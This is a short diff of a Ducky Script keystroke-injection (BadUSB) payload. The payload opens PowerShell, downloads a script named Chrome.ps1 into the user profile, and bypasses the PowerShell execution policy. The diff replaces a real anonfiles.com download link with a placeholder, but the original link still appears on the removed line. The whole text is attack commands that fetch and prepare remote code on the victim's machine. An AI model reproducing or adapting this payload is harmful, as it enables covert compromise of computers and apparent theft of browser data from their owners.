@@ -25,7 +25,7 @@ STRING powershell
 DELAY 400
 ENTER
 DELAY 1000
-STRING (New-Object System.Net.WebClient).DownloadFile("https://anonfiles.com/3cs2DbE0pc/chrome1_ps1","$env:USERPROFILE\Chrome.ps1")
+STRING (New-Object System.Net.WebClient).DownloadFile("CHROME.PS1 LINK HERE","$env:USERPROFILE\Chrome.ps1")
 ENTER
 DELAY 2000
 STRING Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
